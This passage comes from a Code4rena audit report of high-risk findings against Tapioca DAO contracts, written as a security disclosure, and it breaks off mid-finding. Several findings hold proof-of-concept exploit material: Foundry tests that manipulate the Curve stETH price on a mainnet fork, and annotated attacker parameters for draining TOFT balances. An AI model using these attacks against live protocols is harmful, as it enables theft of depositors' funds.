# High Risk Findings (60)

## [[H-06] BalancerStrategy `_withdraw` uses `BPT_IN_FOR_EXACT_TOKENS_OUT` which can be attack to cause loss to all depositors](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1449)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1449)*

Withdrawals can be manipulated to cause complete loss of all tokens.

The BalancerStrategy accounts for user deposits in terms of the BPT shares they contributed, however, for withdrawals, it estimates the amount of BPT to burn based on the amount of ETH to withdraw, which can be manipulated to cause a total loss to the Strategy.

Deposits of weth are done via userData.joinKind set to `1`, which is extracted here in the generic Pool Logic:<br>
<https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49>

The interpretation (by convention is shown here):<br>
<https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49>
```
    enum JoinKind { INIT, EXACT_TOKENS_IN_FOR_BPT_OUT, TOKEN_IN_FOR_EXACT_BPT_OUT }
```

Which means that the deposit is using `EXACT_TOKENS_IN_FOR_BPT_OUT` which is safe in most circumstances (Pool Properly Balanced, with minimum liquidity).

### `BPT_IN_FOR_EXACT_TOKENS_OUT` is vulnerable to manipulation

`_vaultWithdraw` uses the following logic to determine how many BPT to burn:

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/balancer/BalancerStrategy.sol#L224-L242>

```solidity
uint256[] memory minAmountsOut = new uint256[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            if (poolTokens[i] == address(wrappedNative)) {
                minAmountsOut[i] = amount;
                index = int256(i);
            } else {
                minAmountsOut[i] = 0;
            }
        }

        IBalancerVault.ExitPoolRequest memory exitRequest;
        exitRequest.assets = poolTokens;
        exitRequest.minAmountsOut = minAmountsOut;
        exitRequest.toInternalBalance = false;
        exitRequest.userData = abi.encode(
            2,
            exitRequest.minAmountsOut,
            pool.balanceOf(address(this))
        );
```

This query logic is using `2`, which Maps out to `BPT_IN_FOR_EXACT_TOKENS_OUT` which means Exact Out, with any (all) BPT IN, this means that the swapper is willing to burn all tokens:<br>
<https://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L51>
```
        enum ExitKind { EXACT_BPT_IN_FOR_ONE_TOKEN_OUT, EXACT_BPT_IN_FOR_TOKENS_OUT, BPT_IN_FOR_EXACT_TOKENS_OUT }
```

This meets the 2 prerequisite for stealing value from the vault by socializing loss due to single sided exposure:

*   1.  The request is for at least `amount` `WETH`
*   2.  The request is using `BPT_IN_FOR_EXACT_TOKENS_OUT`

Which means the strategy will accept any slippage, in this case 100%, causing it to take a total loss for the goal of allowing a withdrawal, at the advantage of the attacker and the detriment of all other depositors.

### POC

The requirement to trigger the loss are as follows:

*   Deposit to have some amount of BPTs deposited into the strategy
*   Imbalance the Pool to cause pro-rata amount of single token to require burning a lot more BPTs
*   Withdraw from the strategy, the strategy will burn all of the BPTs it owns (more than the shares)
*   Rebalance the pool with the excess value burned from the strategy

### Further Details

Specifically, in withdrawing one Depositor Shares, the request would end up burning EVERYONEs shares, causing massive loss to everyone.

This has already been exploited and explained in Yearns Disclosure:

<https://github.com/yearn/yearn-security/blob/master/disclosures/2022-01-30.md>

More specifically this finding can cause a total loss, while trying to withdraw tokens for a single user, meaning that an attacker can setup the pool to cause a complete loss to all other stakers.

### Mitigation Step

Use `EXACT_BPT_IN_FOR_TOKENS_OUT` and denominate the Strategy in LP tokens to avoid being attacked via single sided exposure.

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1449#issuecomment-1707830222)**

***

## [[H-07] Usage of `BalancerStrategy.updateCache` will cause single sided Loss, discount to Depositor and to OverBorrow from Singularity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1447)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1447), also found by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/977), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/968), and [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/780)*

The BalancerStrategy uses a cached value to determine it's balance in pool for which it takes Single Sided Exposure.

This means that the Strategy has some BPT tokens, but to price them, it's calling `vault.queryExit` which simulates withdrawing the LP in a single sided manner.

Due to the single sided exposure, it's trivial to perform a Swap, that will change the internal balances of the pool, as a way to cause the Strategy to discount it's tokens.

By the same process, we can send more ETH as a way to inflate the value of the Strategy, which will then be cached.

Since `_currentBalance` is a view-function, the YieldBox will accept these inflated values without a way to dispute them

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/balancer/BalancerStrategy.sol#L138-L147>

```solidity
    function _deposited(uint256 amount) internal override nonReentrant {
        uint256 queued = wrappedNative.balanceOf(address(this));
        if (queued > depositThreshold) {
            _vaultDeposit(queued);
            emit AmountDeposited(queued);
        }
        emit AmountQueued(amount);

        updateCache(); /// @audit this is updated too late (TODO PROOF)
    }
```

### POC

*   Imbalance the pool (Sandwich A)
*   Update `updateCache`
*   Deposit into YieldBox, YieldBox is using a `view` function, meaning it will use the manipulated strategy `_currentBalance`
*   `_deposited` trigger an `updateCache`
*   Rebalance the Pool (Sandwich B)
*   Call `updateCache` again to bring back the rate to a higher value
*   Withdraw at a gain

### Result

Imbalance Up -> Allows OverBorrowing and causes insolvency to the protocol
Imbalance Down -> Liquidate Borrowers unfairly at a profit to the liquidator
Sandwhiching the Imbalance can be used to extract value from the strategy and steal user deposits as well

### Mitigation

Use fair reserve math, avoid single sided exposure (use the LP token as underlying, not one side of it)

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1447#issuecomment-1707823835)**

***

## [[H-08] `LidoEthStrategy._currentBalance` is subject to price manipulation, allows overborrowing and liquidations](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1432)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1432), also found by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1361), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/992), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/828), [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/776), and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/248)*

The strategy is pricing stETH as ETH by asking the pool for it's return value

This is easily manipulatable by performing a swap big enough

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L118-L125>

```solidity
    function _currentBalance() internal view override returns (uint256 amount) {
        uint256 stEthBalance = stEth.balanceOf(address(this));
        uint256 calcEth = stEthBalance > 0
            ? curveStEthPool.get_dy(1, 0, stEthBalance) // TODO: Prob manipulatable view-reentrancy
            : 0;
        uint256 queued = wrappedNative.balanceOf(address(this));
        return calcEth + queued;
    }

    /// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yet
    function _deposited(uint256 amount) internal override nonReentrant {
        uint256 queued = wrappedNative.balanceOf(address(this));
        if (queued > depositThreshold) {
            require(!stEth.isStakingPaused(), "LidoStrategy: staking paused");
            INative(address(wrappedNative)).withdraw(queued);
            stEth.submit{value: queued}(address(0)); //1:1 between eth<>stEth // TODO: Prob cheaper to buy stETH
            emit AmountDeposited(queued);
            return;
        }
        emit AmountQueued(amount);
    }
```

### POC

*   Imbalance the Pool to overvalue the stETH

*   Overborrow and Make the Singularity Insolvent

*   Imbalance the Pool to undervalue the stETH

*   Liquidate all Depositors (at optimal premium since attacker can control the price change)

### Coded POC

Logs

```python
[PASS] testSwapStEth() (gas: 372360)
  Initial Price 5443663537732571417920
  Changed Price 2187071651284977907921
  Initial Price 2187071651284977907921
  Changed Price 1073148438886623970
```

```python
[PASS] testSwapETH() (gas: 300192)
Logs:
  value 100000000000000000000000
  Initial Price 5443663537732571417920
  Changed Price 9755041616702274912586
  value 700000000000000000000000
  Initial Price 9755041616702274912586
  Changed Price 680711874102963551173181
```

Considering that swap fees are 1BPS, the attack is profitable at very low TVL

<details>

```solidity
// SPDX-License Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface ICurvePoolWeird {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);

    function get_virtual_price() external view returns (uint256);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 _min_amount) external;

    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Swapper is Test {
    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    uint256 TEN_MILLION_USD_AS_ETH = 5455e18; // Rule of thumb is 1BPS cost means we can use 5 Billion ETH and still be

    function swapETH() external payable {
        console2.log("value", msg.value);
        console2.log("Initial Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));

        pool.exchange{value: msg.value}(0, 1, msg.value, 0); // Swap all yolo

        // curveStEthPool.get_dy(1, 0, stEthBalance)
        console2.log("Changed Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));


    }

    function swapStEth() external {
        console2.log("Initial Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));

        // Always approve exact ;)
        uint256 amt = stETH.balanceOf(address(this));
        stETH.approve(address(pool), stETH.balanceOf(address(this)));

        pool.exchange(1, 0, amt, 0); // Swap all yolo

        // curveStEthPool.get_dy(1, 0, stEthBalance)
        console2.log("Changed Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));
    }

    receive() external payable {}
}

contract CompoundedStakesFuzz is Test {
    Swapper c;
    IERC20 token = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    function setUp() public {
        c = new Swapper();
    }

    function testSwapETH() public {
        deal(address(this), 100_000e18);
        c.swapETH{value: 100_000e18}(); /// 100k ETH is enough to double the price

        deal(address(this), 700_000e18);
        c.swapETH{value: 700_000e18}(); /// 700k ETH is enough to double the price
    }
    function testSwapStEth() public {
        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Has 700k ETH, 100k is sufficient
        token.transfer(address(c), 100_000e18);
        c.swapStEth();

        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Another one for good measure
        token.transfer(address(c), 600_000e18);
        c.swapStEth();
    }
}
```

</details>

### Mitigation

Use the Chainlink stETH / ETH Price Feed or Ideally do not expose the strategy to any conversion, simply deposit and withdraw stETH directly to avoid any risk or attack in conversions

<https://data.chain.link/arbitrum/mainnet/crypto-eth/steth-eth>

<https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth>

**[0xRektora (Tapioca) confirmed via duplicate issue 828](https://github.com/code-423n4/2023-07-tapioca-findings/issues/828)**

***

## [[H-09] `TricryptoLPStrategy.compoundAmount` always returns 0 because it's using staticall vs call](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1428)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1428)*

[`compoundAmount`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/curve/TricryptoLPStrategy.sol#L104-L107) will always try to sell 0 tokens because the `staticall` will revert since the function changes storage in `checkpoint`

This causes the `compoundAmount` to always return 0, which means that the Strategy is underpriced at all times allowing to Steal all Rewards via:

*   Deposit to own a high % of ownerhsip in the strategy (shares are underpriced)
*   Compound (shares socialize the yield to new total supply, we get the majority of that)
*   Withdraw (lock in immediate profits without contributing to the Yield)

### POC

This Test is done on the Arbitrum Tricrypto Gauge with Foundry

1 is the flag value for a revert
0 is the expected value

We get 1 when we use staticcall since the call reverts internally
We get 0 when we use call since the call doesn't

The comment in the Gauge Code is meant for usage off-chain, onChain you must accrue (or you could use a Accrue Then Revert Pattern, similar to UniV3 Quoter)

NOTE: The code for Mainnet is the same, so it will result in the same impact <br><https://etherscan.io/address/0xDeFd8FdD20e0f34115C7018CCfb655796F6B2168#code#L375>

### Foundry POC

    forge test --match-test test_callWorks --rpc-url https://arb-mainnet.g.alchemy.com/v2/ALCHEMY_KEY

Which will revert since `checkpoint` is a non-view function and staticall reverts if any state is changed

<https://arbiscan.io/address/0x555766f3da968ecbefa690ffd49a2ac02f47aa5f#code#L168>

<details>

```solidity

// SPDX-License Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";



contract GaugeCallTest is Test {
    
    // Arb Tricrypto Gauge
    address lpGauge = 0x555766f3da968ecBefa690Ffd49A2Ac02f47aa5f;

    function setUp() public {}

    function doTheCallView() internal returns (uint256) {
        (bool success, bytes memory response) = address(lpGauge).staticcall(
            abi.encodeWithSignature("claimable_tokens(address)", address(this))
        );

        uint256 claimable = 1;
        if (success) {
            claimable = abi.decode(response, (uint256));
        }

        return claimable;
    }
    function doTheCallCall() internal returns (uint256) {
        (bool success, bytes memory response) = address(lpGauge).call(
            abi.encodeWithSignature("claimable_tokens(address)", address(this))
        );

        uint256 claimable = 1;
        if (success) {
            claimable = abi.decode(response, (uint256));
        }

        return claimable;
    }

    function test_callWorks() public {
        uint256 claimableView = doTheCallView();

        assertEq(claimableView, 1); // Return 1 which is our flag for failure

        uint256 claimableNonView = doTheCallCall();

        assertEq(claimableNonView, 0); // Return 0 which means we read the proper value
    }
}
```

</details>

### Mitigation Step

You should use a non-view function like in `compound`

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1428#issuecomment-1707821609)**

***

## [[H-10] Liquidated USDO from BigBang not being burned after liquidation inflates USDO supply and can threaten peg permanently](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1355)
*Submitted by [unsafesol](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1355), also found by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1166), [0xnev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/741), [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/118), and [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/99)*

Absence of proper USDO burn after liquidation in the BigBang market results in a redundant amount of USDO being minted without any collateral or backing. Thus, the overcollaterization of USDO achieved through BigBang will be eventually lost and the value of USDO in supply (1USDO = 1&#36;) will exceed the amount of collateral locked in BigBang. This has multiple repercussions- the USDO peg will be threatened and yieldBox will have USDO which has virtually no value, resulting in all the BigBang strategies failing.

### Proof of Concept

According to the Tapioca documentation, the BigBang market mints USDO when a user deposits sufficient collateral and borrows tokens. When a user repays the borrowed USDO, the market burns the borrowed USDO and unlocks the appropriate amount of collateral. This is essential to the peg of USDO, since USDO tokens need a valid collateral backing.

While liquidating a user as well, the same procedure should be followed- after swapping the user’s collateral for USDO, the repaid USDO (with liquidation) must be burned so as to sustain the USDO peg. However, this is not being done.
As we can see here: <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L618-L637>, the collateral is swapped for USDO, and fee is extracted and transferred to the appropriate parties, but nothing is done for the remaining USDO which was repaid. At the same time, this was done correctly done in BigBang#\_repay for repayment here: <https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L734-L736>.

This has the following effects:

1.  The BigBang market now has redundant yieldBox USDO shares which have no backing.
2.  The redundant USDO is now performing in yieldBox strategies of tapioca.
3.  The USDO eventually becomes overinflated and exceeds the value of underlying collateral.
4.  The strategies start not performing since they have unbacked USDO, and the USDO peg is lost as well since there is no appropriate amount of underlying collateral.

### Recommended Mitigation Steps

Burn the USDO acquired through liquidation after extracting fees for appropriate parties.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1355#issuecomment-1703046614)**

***

## [[H-11] TOFT `exerciseOption` can be used to steal all underlying erc20 tokens](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1307)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1307), also found by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/941)*

Unvalidated input data for the [`exerciseOption`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L127) function can be used to steal all the erc20 tokens from the contract.

### Proof of Concept

Each [BaseTOFT](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol) is a wrapper around an `erc20` token and extends the `OFTV2` contract to enable smooth cross-chain transfers through LayerZero.
Depending on the erc20 token which is used usually the erc20 tokens will be held on one chain and then only the shares of `OFTV2` get transferred around (burnt on one chain, minted on another chain).
Subject to this attack is `TapiocaOFTs` or `mTapiocaOFTs` which store as an [underlying token an erc20 token(not native)](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L77). In order to mint `TOFT` shares you need to deposit the underlying erc20 tokens into the contract, and you get `TOFT` shares.

The attack flow is the following:

1.  The attack starts from the [`exerciseOption`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L127-L146). Nothing is validated here and the only cost of the attack is the [`optionsData.paymentTokenAmount`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L87) which is burned from the attacker. This can be some small amount.
2.  When the message is received on the remote chain inside the [`exercise`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L153) function it is important that nothing reverts for the attacker.
3.  For the attacker to go through the attacker needs to pass the following data:

```soldity
function exerciseInternal(
        address from,
        uint256 oTAPTokenID,
        address paymentToken,
        uint256 tapAmount,
        address target,
        ITapiocaOptionsBrokerCrossChain.IExerciseLZSendTapData
            memory tapSendData,
        ICommonData.IApproval[] memory approvals
    ) public {
        // pass zero approval so this is skipped 
        if (approvals.length > 0) {
            _callApproval(approvals);
        }
        
        // target is the address which does nothing, but has the exerciseOption implemented
        ITapiocaOptionsBroker(target).exerciseOption(
            oTAPTokenID,
            paymentToken,
            tapAmount
        );
        // tapSendData.withdrawOnAnotherChain = false so we enter else branch
        if (tapSendData.withdrawOnAnotherChain) {
            ISendFrom(tapSendData.tapOftAddress).sendFrom(
                address(this),
                tapSendData.lzDstChainId,
                LzLib.addressToBytes32(from),
                tapAmount,
                ISendFrom.LzCallParams({
                    refundAddress: payable(from),
                    zroPaymentAddress: tapSendData.zroPaymentAddress,
                    adapterParams: LzLib.buildDefaultAdapterParams(
                        tapSendData.extraGas
                    )
                })
            );
        } else {
            // tapSendData.tapOftAddress is the address of the underlying erc20 token for this TOFT
            // from is the address of the attacker
            // tapAmount is the balance of erc20 tokens of this TOFT
            IERC20(tapSendData.tapOftAddress).safeTransfer(from, tapAmount);
        }
    }
```

4.  So the attack is just simply transferring all the underlying erc20 tokens to the attacker.

The underlying `ERC20` token for each `TOFT` can be queried through [`erc20()`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFTStorage.sol#L28) function, and the `tapAmount` to pass is `ERC20` balance of the `TOFT`.

This attack is possible because the `msg.sender` inside the `exerciseInternal` is the address of the `TOFT` which is the owner of all the ERC20 tokens that get stolen.

### Recommended Mitigation Steps

Validate that `tapSendData.tapOftAddress` is the address of [`TapOFT`](https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/TapOFT.sol) token either while sending the message or during the reception of the message on the remote chain.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1307#issuecomment-1703035021)**

***

## [[H-12] TOFT `removeCollateral` can be used to steal all the balance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1293)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1293), also found by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1643)*

[`removeCollateral`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L190) -> [`remove`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L512) message pathway can be used to steal all the balance of the [`TapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol) and [`mTapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/mTapiocaOFT.sol) tokens in case when their underlying tokens is native.
TOFTs that hold native tokens are deployed with [erc20 address](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L35) set to address zero, so while [minting you need to transfer value](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L74).

### Proof of Concept

The attack needs to be executed by invoking the [`removeCollateral`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L190) function from any chain to chain on which the underlying balance resides, e.g. host chain of the TOFT.
When the message is [received on the remote chain](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L204-L258), I have placed in the comments below what are the params that need to be passed to execute the attack.

<details>

```solidity
    function remove(bytes memory _payload) public {
    (
        ,
        ,
        address to,
        ,
        ITapiocaOFT.IRemoveParams memory removeParams,
        ICommonData.IWithdrawParams memory withdrawParams,
        ICommonData.IApproval[] memory approvals
    ) = abi.decode(
        _payload,
        (
            uint16,
            address,
            address,
            bytes32,
            ITapiocaOFT.IRemoveParams,
            ICommonData.IWithdrawParams,
            ICommonData.IApproval[]
        )
    );
    // approvals can be an empty array so this is skipped
    if (approvals.length > 0) {
        _callApproval(approvals);
    }

    // removeParams.market and removeParams.share don't matter 
    approve(removeParams.market, removeParams.share);
    // removeParams.market just needs to be deployed by the attacker and do nothing, it is enough to implement IMarket interface
    IMarket(removeParams.market).removeCollateral(
        to,
        to,
        removeParams.share
    );
    
    // withdrawParams.withdraw =  true to enter the if block
    if (withdrawParams.withdraw) {
        // Attackers removeParams.market contract needs to have yieldBox() function and it can return any address
        address ybAddress = IMarket(removeParams.market).yieldBox();
        // Attackers removeParams.market needs to have collateralId() function and it can return any uint256
        uint256 assetId = IMarket(removeParams.market).collateralId();
        
        // removeParams.marketHelper is a malicious contract deployed by the attacker which is being transferred all the balance
        // withdrawParams.withdrawLzFeeAmount needs to be precomputed by the attacker to match the balance of TapiocaOFT
        IMagnetar(removeParams.marketHelper).withdrawToChain{
                value: withdrawParams.withdrawLzFeeAmount // This is not validated on the sending side so it can be any value
            }(
            ybAddress,
            to,
            assetId,
            withdrawParams.withdrawLzChainId,
            LzLib.addressToBytes32(to),
            IYieldBoxBase(ybAddress).toAmount(
                assetId,
                removeParams.share,
                false
            ),
            removeParams.share,
            withdrawParams.withdrawAdapterParams,
            payable(to),
            withdrawParams.withdrawLzFeeAmount
        );
    }
}
```

</details>

Neither `removeParams.marketHelper` or `withdrawParams.withdrawLzFeeAmount` are validated on the sending side so the former can be the address of a malicious contract and the latter can be the TOFT's balance of gas token.

This type of attack is possible because the `msg.sender` in `IMagnetar(removeParams.marketHelper).withdrawToChain` is the address of the TOFT contract which holds all the balances.

This is because:

1.  Relayer submits the message to [`lzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/LzApp.sol#L35) so he is the `msg.sender`.
2.  Inside the [`_blockingLzReceive`](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L25) there is a call into its own public function so the `msg.sender` is the [address of the contract](https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/lzApp/NonblockingLzApp.sol#L39).
3.  Inside the `_nonBlockingLzReceive` there is [delegatecall](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L411) into a corresponding module which preserves the `msg.sender` which is the address of the TOFT.
4.  Inside the module there is a call to [withdrawToChain](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L239) and here the `msg.sender` is the address of the TOFT contract, so we can maliciously transfer all the balance of the TOFT.

### Tools Used

Foundry

### Recommended Mitigation Steps

It's hard to recommend a simple fix since as I pointed out in my other issues the airdropping logic has many flaws.
One of the ways of tackling this issue is during the [`removeCollateral`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L190) to:

*   Do not allow `adapterParams` params to be passed as bytes but rather as `gasLimit` and `airdroppedAmount`, from which you would encode either `adapterParamsV1` or `adapterParamsV2`.
*   And then on the receiving side check and send with value only the amount the user has airdropped.

**[0xRektora (Tapioca) confirmed and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1293#issuecomment-1703000096):**
 > Related to https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290

***

## [[H-13] TOFT `triggerSendFrom` can be used to steal all the balance](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290)
*Submitted by [windhustler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1290)*

[`triggerSendFrom`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L99) -> [`sendFromDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L551) message pathway can be used to steal all the balance of the [`TapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol) and [`mTapiocaOFT`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/mTapiocaOFT.sol)\` tokens in case when their underlying tokens is native gas token.
TOFTs that hold native tokens are deployed with [erc20 address](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L35) set to address zero, so while [minting you need to transfer value](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/TapiocaOFT.sol#L74).

### Proof of Concept

The attack flow is the following:

1.  Attacker calls `triggerSendFrom` with [`airdropAdapterParams`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L41) of type [airdropAdapterParamsV1](https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters) which don't airdrop any value on the remote chain but just deliver the message.
2.  On the other hand [lzCallParams](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L44) are of type `adapterParamsV2` which are used to airdrop the balance from the destination chain to another chain to the attacker.

```solidity
struct LzCallParams {
    address payable refundAddress; // => address of the attacker
    address zroPaymentAddress; // => doesn't matter
    bytes adapterParams; //=> airdropAdapterParamsV2
}
```

3.  Whereby the `sendFromData.adapterParams` would be encoded in the following way:

```solidity
function encodeAdapterParamsV2() public {
    // https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters#airdrop
    uint256 gasLimit = 250_000; // something enough to deliver the message
    uint256 airdroppedAmount = max airdrop cap defined at https://layerzero.gitbook.io/docs/evm-guides/advanced/relayer-adapter-parameters#airdrop. => 0.24 for ethereum, 1.32 for bsc, 681 for polygon etc.
    address attacker = makeAddr("attacker"); // => address of the attacker
    bytes memory adapterParams = abi.encodePacked(uint16(2), gasLimit, airdroppedAmount, attacker);
}
```

4.  When this is received on the remote inside the [`sendFromDestination`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L118) [`ISendFrom(address(this)).sendFrom{value: address(this).balance}`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142)
    is instructed by the malicious `ISendFrom.LzCallParams memory callParams`to actually airdrop the max amount allowed by LayerZero to the attacker on the [`lzDstChainId`](https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L144).
5.  Since there is a cap on the maximum airdrop amount this type of attack would need to be executed multiple times to drain the balance of the TOFT.

The core issue at play here is that `BaseTOFT` delegatecalls into the `BaseTOFTOptionsModule` and thus the BaseTOFT is the `msg.sender` for `sendFrom` function.

There is also another simpler attack flow possible:

